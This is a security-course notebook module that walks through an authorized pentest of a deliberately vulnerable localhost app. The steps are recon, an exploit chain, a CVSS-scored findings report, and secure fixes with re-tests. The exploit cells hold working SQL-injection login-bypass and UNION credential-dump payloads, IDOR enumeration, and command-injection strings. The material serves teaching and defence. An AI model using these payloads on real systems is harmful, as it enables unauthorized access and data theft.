# Module 26 — Capstone: A Full Pentest of vulnlab

**Purpose:** Pull the whole track together into one engagement, the way a real
assessment runs: **recon → exploit chain → findings report → remediation → re-test.**
A pentest isn't a pile of payloads — its deliverable is a *prioritized, reproducible
report* the team can act on. You'll produce exactly that, then prove each fix works.

**Prerequisites:** Modules 21–25 (the full security track).

> ♻️ **Ethics reminder (Module 21):** this is an authorized test of `vulnlab`, an app
> you run on localhost. A real engagement starts with a signed scope/authorization.

**The engagement phases:**
1. **Recon** — map the attack surface (Module 22)
2. **Exploitation** — chain flaws into real impact (Modules 23–25)
3. **Reporting** — findings with severity/CVSS (this module)
4. **Remediation** — fix each flaw and **re-test** to confirm

In [ ]:
import sys, os

def _add_vulnlab_to_path() -> None:
    p = os.getcwd()
    for _ in range(6):
        cand = os.path.join(p, "23_web_app_security")
        if os.path.isdir(os.path.join(cand, "vulnlab")):
            sys.path.insert(0, cand)
            return
        p = os.path.dirname(p)
    raise RuntimeError("Could not locate 23_web_app_security/vulnlab")

_add_vulnlab_to_path()
from fastapi.testclient import TestClient
from vulnlab.main import app

client = TestClient(app)
client.__enter__()
print("Engagement target: vulnlab (in-process, localhost). Scope: this app only.")

## Phase 1 — Recon (map the attack surface)

Enumerate live endpoints and flag the high-interest ones (Module 22 methodology).

In [ ]:
WORDLIST = ["/health", "/login", "/search", "/profile/1", "/notes/1",
            "/comments", "/fetch", "/ping", "/admin", "/secret"]
live = [p for p in WORDLIST if client.get(p).status_code != 404]
print("Live endpoints:", live)
RISKY = ("login", "search", "fetch", "ping", "profile")
print("High-interest:", [p for p in live if any(k in p for k in RISKY)])

## Phase 2 — Exploitation (chain the flaws)

A good pentest shows **impact**, not just a vuln list. We chain bugs into a realistic
kill chain: SQLi → credential dump → API-token theft → private-data access → RCE.

In [ ]:
findings = []  # accumulate structured findings as we go

# --- Step 1: SQLi auth bypass → admin session ---
r = client.post("/login", json={"username": "alice", "password": "x' OR '1'='1"})
admin = r.status_code == 200 and r.json().get("role") == "admin"
print("1. SQLi auth bypass -> admin:", admin)

# --- Step 2: SQLi UNION → dump all credentials + API tokens ---
exfil = "zzz%' UNION SELECT id, username, password FROM users -- "
creds = client.get("/search", params={"q": exfil}).json()["results"]
print("2. Dumped credentials:", {row["owner"]: row["title"] for row in creds})

# --- Step 3: IDOR → read every user's private notes ---
private = []
for nid in range(1, 6):
    n = client.get(f"/notes/{nid}").json()
    if n.get("private"):
        private.append((n["owner"], n["title"]))
print("3. IDOR leaked private notes:", private)

# --- Step 4: Command injection → remote code execution ---
rce = client.post("/ping", json={"host": "127.0.0.1; echo RCE-PROOF"}).json()
print("4. RCE via command injection:", "RCE-PROOF" in rce["stdout"])

## Phase 3 — The findings report

Each finding gets a **severity** driven by a **CVSS** vector. CVSS v3.1 scores
0.0–10.0; the band gives the label:

| Score | Severity |
|-------|----------|
| 9.0–10.0 | Critical |
| 7.0–8.9 | High |
| 4.0–6.9 | Medium |
| 0.1–3.9 | Low |

In [ ]:
def severity(score: float) -> str:
    if score >= 9.0:
        return "Critical"
    if score >= 7.0:
        return "High"
    if score >= 4.0:
        return "Medium"
    return "Low"


findings = [
    {"id": "VL-01", "title": "SQL injection in /login (auth bypass)", "owasp": "A03",
     "cvss": 9.8, "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
     "evidence": "password=\"x' OR '1'='1\" returns an admin session",
     "fix": "Parameterized queries; bcrypt password storage"},
    {"id": "VL-02", "title": "SQL injection in /search (UNION exfiltration)", "owasp": "A03",
     "cvss": 8.6, "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
     "evidence": "UNION SELECT dumps users.password + api_token",
     "fix": "Parameterized queries; least-privilege DB account"},
    {"id": "VL-03", "title": "IDOR on /notes/{id} and /profile/{id}", "owasp": "A01",
     "cvss": 7.5, "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
     "evidence": "Any user reads private notes & others' api_token by id",
     "fix": "Server-side ownership/role checks on every object access"},
    {"id": "VL-04", "title": "Reflected & stored XSS", "owasp": "A03",
     "cvss": 6.1, "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
     "evidence": "<script> reflected by /greet and stored via /comments",
     "fix": "Context-aware output encoding; CSP; HttpOnly cookies"},
    {"id": "VL-05", "title": "OS command injection in /ping", "owasp": "A03",
     "cvss": 9.8, "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
     "evidence": "host=\"127.0.0.1; echo RCE-PROOF\" executes arbitrary commands",
     "fix": "subprocess arg-list (no shell=True); input allow-list"},
    {"id": "VL-06", "title": "SSRF in /fetch", "owasp": "A10",
     "cvss": 7.7, "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
     "evidence": "Server fetches arbitrary internal URLs",
     "fix": "Host allow-list; block private/link-local ranges; no redirects"},
]

# Render the report, highest severity first.
findings.sort(key=lambda f: f["cvss"], reverse=True)
print(f"{'ID':6} {'CVSS':5} {'SEV':9} OWASP  TITLE")
print("-" * 78)
for f in findings:
    print(f"{f['id']:6} {f['cvss']:<5} {severity(f['cvss']):9} {f['owasp']:6} {f['title']}")

### Exercise 1 — Executive summary stats

**Purpose:** Reports open with an executive summary: counts by severity drive
remediation priority and budget. You'll compute it.

Write `severity_counts(findings)` returning a dict like
`{"Critical": 2, "High": 2, "Medium": 1, "Low": 0}` (include zero-count bands), using
the `severity()` function above.

In [ ]:
# TODO: Implement severity_counts(findings: list[dict]) -> dict[str, int]
def severity_counts(findings: list[dict]) -> dict[str, int]:
    ...  # your code here

In [ ]:
# SOLUTION
def severity_counts(findings: list[dict]) -> dict[str, int]:
    counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
    for f in findings:
        counts[severity(f["cvss"])] += 1
    return counts


print("Executive summary:", severity_counts(findings))

### Optional — write the report to a Markdown file

Real deliverables are documents. This builds a `REPORT.md` next to the notebook.

In [ ]:
lines = ["# vulnlab — Penetration Test Report\n",
         "**Scope:** vulnlab (localhost). **Authorization:** lab exercise.\n",
         f"**Summary:** {severity_counts(findings)}\n", "## Findings\n"]
for f in findings:
    lines += [
        f"### {f['id']} — {f['title']} ({severity(f['cvss'])}, CVSS {f['cvss']})\n",
        f"- **OWASP:** {f['owasp']}",
        f"- **CVSS vector:** `{f['cvss_vector']}`",
        f"- **Evidence:** {f['evidence']}",
        f"- **Remediation:** {f['fix']}\n",
    ]
with open("REPORT.md", "w") as fh:
    fh.write("\n".join(lines))
print("Wrote REPORT.md with", len(findings), "findings.")

## Phase 4 — Remediation & re-test

Fixing in `vulnlab` itself would erase the lab, so we implement **secure versions of
the vulnerable handlers** here and replay the same exploits — proving each attack is
now blocked (the attack→defend loop, end to end).

In [ ]:
import sqlite3, html, subprocess, ipaddress, urllib.parse
from vulnlab.database import connect

# --- Fix VL-01/02: parameterized queries ---
def secure_login(username: str, password: str) -> bool:
    conn = connect()
    row = conn.execute(
        "SELECT 1 FROM users WHERE username = ? AND password = ?", (username, password)
    ).fetchone()
    conn.close()
    return row is not None

print("VL-01 re-test  SQLi bypass blocked:",
      secure_login("alice", "x' OR '1'='1") is False)
print("VL-01 re-test  real login still works:", secure_login("alice", "hunter2") is True)

# --- Fix VL-03: server-side authorization ---
def secure_get_note(note_id: int, current_user: str) -> dict | None:
    conn = connect()
    row = conn.execute("SELECT * FROM notes WHERE id = ?", (note_id,)).fetchone()
    conn.close()
    if row is None:
        return None
    note = dict(row)
    if note["private"] and note["owner"] != current_user:
        return None  # 403 — not yours
    return note

print("VL-03 re-test  IDOR on private note blocked:",
      secure_get_note(2, current_user="bob") is None)        # bob can't read alice's
print("VL-03 re-test  owner still allowed:",
      secure_get_note(2, current_user="alice") is not None)

# --- Fix VL-04: output encoding ---
def secure_greet(name: str) -> str:
    return f"<h1>Hello, {html.escape(name)}!</h1>"

print("VL-04 re-test  XSS neutralized:",
      "<script>" not in secure_greet("<script>alert(1)</script>"))

# --- Fix VL-05: no shell, arg-list + allow-list ---
def secure_ping(host: str) -> str:
    # Allow only valid IP addresses — reject anything with shell metacharacters.
    try:
        ipaddress.ip_address(host)
    except ValueError:
        return "rejected: not a valid IP"
    out = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=5)
    return out.stdout

print("VL-05 re-test  command injection blocked:",
      secure_ping("127.0.0.1; echo RCE-PROOF") == "rejected: not a valid IP")

# --- Fix VL-06: SSRF allow-list ---
def secure_fetch(url: str, allowed_hosts={"api.internal.example"}) -> str:
    host = urllib.parse.urlparse(url).hostname or ""
    try:
        if ipaddress.ip_address(host).is_private:
            return "rejected: private IP"
    except ValueError:
        pass  # not an IP literal; fall through to host allow-list
    if host not in allowed_hosts:
        return "rejected: host not allow-listed"
    return "would fetch (allow-listed)"

print("VL-06 re-test  SSRF to localhost blocked:",
      secure_fetch("http://127.0.0.1:8000/").startswith("rejected"))

In [ ]:
client.__exit__(None, None, None)
print("\nEngagement complete. All findings reported and remediations verified.")

### Exercise 2 — Confirm remediation coverage

**Purpose:** A pentest closes by verifying *every* finding has a working fix. Write
`remediation_report()` that re-runs each secure_* check and returns a dict mapping
finding id → `True` (blocked) / `False` (still vulnerable). Every value should be
`True`.

In [ ]:
# TODO: Implement remediation_report() -> dict[str, bool]
# Map "VL-01"..."VL-06" to a boolean: does the secure version block the original exploit?
def remediation_report() -> dict[str, bool]:
    ...  # your code here

In [ ]:
# SOLUTION
def remediation_report() -> dict[str, bool]:
    return {
        "VL-01": secure_login("alice", "x' OR '1'='1") is False,
        "VL-02": secure_login("alice", "' UNION SELECT 1 -- ") is False,
        "VL-03": secure_get_note(2, "bob") is None,
        "VL-04": "<script>" not in secure_greet("<script>x</script>"),
        "VL-05": secure_ping("127.0.0.1; id").startswith("rejected"),
        "VL-06": secure_fetch("http://127.0.0.1/").startswith("rejected"),
    }


report = remediation_report()
print("Remediation coverage:", report)
print("All findings fixed:", all(report.values()))

## What you learned — and the whole track

You ran a complete engagement: **recon → exploit chain → CVSS-scored report →
remediation → re-test**. That loop is the job.

| Phase | Skill | Module |
|-------|-------|--------|
| Recon | ports, services, endpoints | 21, 22 |
| Exploit | OWASP web flaws, auth, crypto | 23, 24, 25 |
| Report | severity, CVSS, evidence | 26 |
| Remediate | parameterize, encode, authz, allow-list | 26 |

**Where to go next:** take these skills to legal practice ranges — TryHackMe,
Hack The Box, PortSwigger Web Security Academy, OverTheWire — and consider the
PNPT/OSCP certifications. Always with authorization.

## Further reading

- **OWASP Web Security Testing Guide** (full methodology):
  https://owasp.org/www-project-web-security-testing-guide/
- **CVSS v3.1 specification & calculator**: https://www.first.org/cvss/calculator/3.1
- **PTES — Penetration Testing Execution Standard**: http://www.pentest-standard.org/
- **NIST SP 800-115** — Technical Guide to Information Security Testing:
  https://csrc.nist.gov/pubs/sp/800/115/final
- **MITRE ATT&CK** (adversary tactics & techniques): https://attack.mitre.org/

**You've finished the White-Hat track.** Hack ethically, report clearly, fix the root cause.